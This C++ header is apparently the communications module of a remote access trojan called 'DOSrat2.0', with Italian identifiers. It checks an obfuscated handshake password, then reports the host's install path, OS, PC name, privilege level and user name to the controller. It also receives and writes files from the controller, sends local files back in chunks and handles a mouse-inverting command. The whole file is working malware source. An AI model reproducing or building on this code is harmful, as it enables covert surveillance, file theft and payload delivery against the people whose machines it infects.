#pragma once

class COMUNICAZIONI
{
private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

public:
	struct NewClient
	{
		string Str;
		Json j;
	};

	static bool Inizializzazione(SOCKET Sock)
	{
		DirUtils du;
		SystemUtils su;
		EasyMSGB msgb;

		string Pass = (string)AY_OBFUSCATE("DOSrat2.0");
		char Buff[10];

		TcpIP::SetTimeout(10000, Sock);

		if (send(Sock, Pass.c_str(), 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if (recv(Sock, Buff, 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if ((string)Buff != Pass)
		{
			TerminaConnessione(Sock);
			return false;
		}

		TcpIP::SetTimeout(0, Sock);
		Json data;

		data["InstallPath"] = du.GetFullModuleFilePath();
		data["OS"] = su.GetOS();
		data["PCname"] = su.GetPCName();
		data["UAC"] = (su.CheckUAC()) ? "Admin" : "User";
		data["UserName"] = su.GetCurrentUser();
		data["Versione"] = Version;
		data["VersioneCompatibile"] = VersioneCompatibile;

		TcpIP::SendString(Sock, data.dump());

		return true;
	}

	static bool InvertMouse(SOCKET Sock, bool MouseStatus)
	{
		if (MouseStatus)
		{
			if (TcpIP::SendString(Sock, "a"))
				return true;
		}
		else
			if (TcpIP::SendString(Sock, "b"))
				return true;

		return false;
	}

	static NewClient UpdateClient(SOCKET Sock)
	{
		string Buff;
		NewClient NC;

		if (TcpIP::RecvString(Sock, Buff))
		{
			NC.Str = Buff;

			if (TcpIP::RecvString(Sock, Buff))
			{
				NC.j = Json::parse(Buff);
				TcpIP::SendString(Sock, "OK");
			}
			else
				TcpIP::SendString(Sock, "NO");
		}
		else
			TcpIP::SendString(Sock, "NO");

		return NC;
	}

	static string PingPong(SOCKET Sock, string send)
	{
		string Buff = "";

		if (!TcpIP::SendString(Sock, send))
			return "";

		if (!TcpIP::RecvString(Sock, Buff))
			return "";

		return Buff;
	}

	static short DownloadFileWithLoading(SOCKET Sock)
	{
		DirUtils du;
		string strFileSize;
		string FileName;
		string Buff = "";
		int ChunkSize = 64000;
		short rtnValue = 0;

		if (!TcpIP::RecvString(Sock, FileName))
			return 1;

		if (!TcpIP::RecvString(Sock, strFileSize))
			return 1;

		debug.log.Info("\nNome: " + FileName + "\nDimensione: " + strFileSize);

		if (!TcpIP::RecvString(Sock, Buff))
			return 1;

		if (Buff == "KO")
			return 2;

		Buff.clear();

		if (du.CheckFile(FileName))
			du.DelFile(FileName);

		if (!du.WriteFile(FileName))
			rtnValue = 2;

		long long FileSize = stoll(strFileSize);

		debug.log.Info("Ricezione in corso...");

		if (FileSize > ChunkSize)
		{
			int ChunkNumber = (FileSize / ChunkSize) + (FileSize % ChunkSize == 0 ? 0 : 1);

			for (int i = 0; i < ChunkNumber; i++)
			{
				if (!TcpIP::RecvString(Sock, Buff))
					return 1;

				if (!du.AppendToBinaryFile(FileName, Buff))
					rtnValue = 2;

				Buff.clear();
			}
		}
		else if (FileSize > 0)
		{
			if (!TcpIP::RecvString(Sock, Buff))
				return 1;

			if (!du.AppendToBinaryFile(FileName, Buff))
				rtnValue = 2;
		}

		debug.log.Info("File ricevuto " + to_string(rtnValue));

		return rtnValue;
	}

	static bool UploadFileWithLoading(SOCKET Sock, string FileName, string FilePath)
	{
		DirUtils du;
		ifstream infile;
		long long FileSize = du.GetSizeOfFile(FilePath);
		int ChunkSize = 64000;
		string Buff(ChunkSize, '\0');

		debug.log.Info("\nNome: " + FileName + "\nDimensione: " + to_string(FileSize));

		if (!TcpIP::SendString(Sock, FileName))
			return false;

		if (!TcpIP::SendString(Sock, to_string(FileSize)))
			return false;

		infile.open(FilePath.c_str(), std::ios::binary);
		if (!infile.is_open())
		{
			if (!TcpIP::SendString(Sock, "KO"))
				return false;
			return true;
		}
		else
		{
			if (!TcpIP::SendString(Sock, "OK"))
				return false;
		}

		debug.log.Info("Invio in corso...");

		if (FileSize > ChunkSize)
		{
			int ChunkNumber = (FileSize / ChunkSize) + (FileSize % ChunkSize == 0 ? 0 : 1);

			for (int i = 0; i < ChunkNumber; i++)
			{
				Buff.clear();

				if (i + 1 == ChunkNumber)
					Buff = string((int)(FileSize - (ChunkSize * (ChunkNumber - (FileSize % ChunkSize == 0 ? 0 : 1)))), '\0');
				else
					Buff = string(ChunkSize, '\0');

				infile.read(&Buff[0], Buff.size());

				if (!TcpIP::SendString(Sock, Buff))
				{ infile.close(); return false; }
			}

			Buff.clear();
			infile.close();
		}
		else if (FileSize > 0)
		{
			infile.close();

			if (!TcpIP::SendString(Sock, du.GetBinaryFileContent(FilePath)))
				return false;
		}

		infile.close();
		debug.log.Info("File inviato");

		return true;
	}
};